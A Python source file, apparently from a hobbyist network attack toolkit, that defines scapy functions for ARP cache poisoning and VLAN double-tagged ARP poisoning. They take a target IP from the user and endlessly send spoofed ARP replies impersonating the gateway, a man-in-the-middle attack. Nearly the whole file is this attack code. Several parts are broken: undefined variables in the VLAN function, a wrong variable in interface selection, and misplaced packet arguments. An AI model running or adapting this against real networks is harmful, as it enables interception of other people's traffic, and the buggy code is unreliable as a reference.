
#----------------------------------------------------------------------------------------------------------------------------------------------------------
#Imports
from scapy.all import *
import ipaddress, socket, time
from rich.console import Console
from rich.table import Table
from rich.live import Live
import time
import pyfiglet
from termcolor import colored
import netifaces
import ipaddress
from identifiers.ether import get_mac, get_my_mac, arp_scan
from identifiers.gateway import gateway_info, get_gateway_mac

#variables in the rich library
console = Console()
#----------------------------------------------------------------------------------------------------------------------------------------------------------
#Global Variables

router = gateway_info()
gateway_mac = get_gateway_mac()

#----------------------------------------------------------------------------------------------------------------------------------------------------------

# Scapy ARP poison packet insertions under layer2 protocol 
def arp_cache_poison(iface=None, target_ip=None, router_ip=None, router_mac=None, target_mac=None, source_mac=None):
    
    try:
        target_ip_input = console.input(str("[yellow]| Enter Target IP:"))
    
        if target_ip is None:
            target_ip = target_ip_input
        if target_mac is None:
            target_mac = get_mac(target_ip)
        if not target_mac:
            console.print(f"[red] Could not resolve MAC for {target_ip}")
            return 

        if source_mac is None:
            source_mac = get_my_mac()
        if not source_mac:
            console.print(f"[red] Could not resolve MAC for host")
            return

        if router_mac is None:
            router_mac = gateway_mac

        if router_mac is None:
            router_ip = router.get("Gateway")
        
        if iface is None:
            iface =  netifaces.interfaces()
            for i, ifaces in enumerate(iface, start=1):
                print(f"{i}. {ifaces}")
            iface_choice = int(input("Select interface: "))

            iiface = ifaces[iface_choice - 1]
            print("You chose:", iiface)
    except Exception as e:
        print(f"Var Exception Error: {e}"); return False 
     
    try:
        
        pkt = Ether(dst=target_mac)/ARP(iface=iface, psrc=router_ip, pdst=target_ip_input)

        sendp(pkt, inter=RandNum(10,40), loop=1)

    except Exception as e:
        print(f"Pkt Exception Error: {e}"); return False 



#Scapy ARP insertion under layer 2 protocol per VLAN
def arp_vlan_poison():
    target_ip = console.input("[yellow]| Enter Target IP:")
    target_mac = get_mac(target_ip)

    sendp(Ether(dst=target_mac)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
        /ARP(op="who-has", psrc=gateway, pdst=client,
        inter=RandNum(10,40)))



#----------------------------------------------------------------------------------------------------------------------------------------------------------

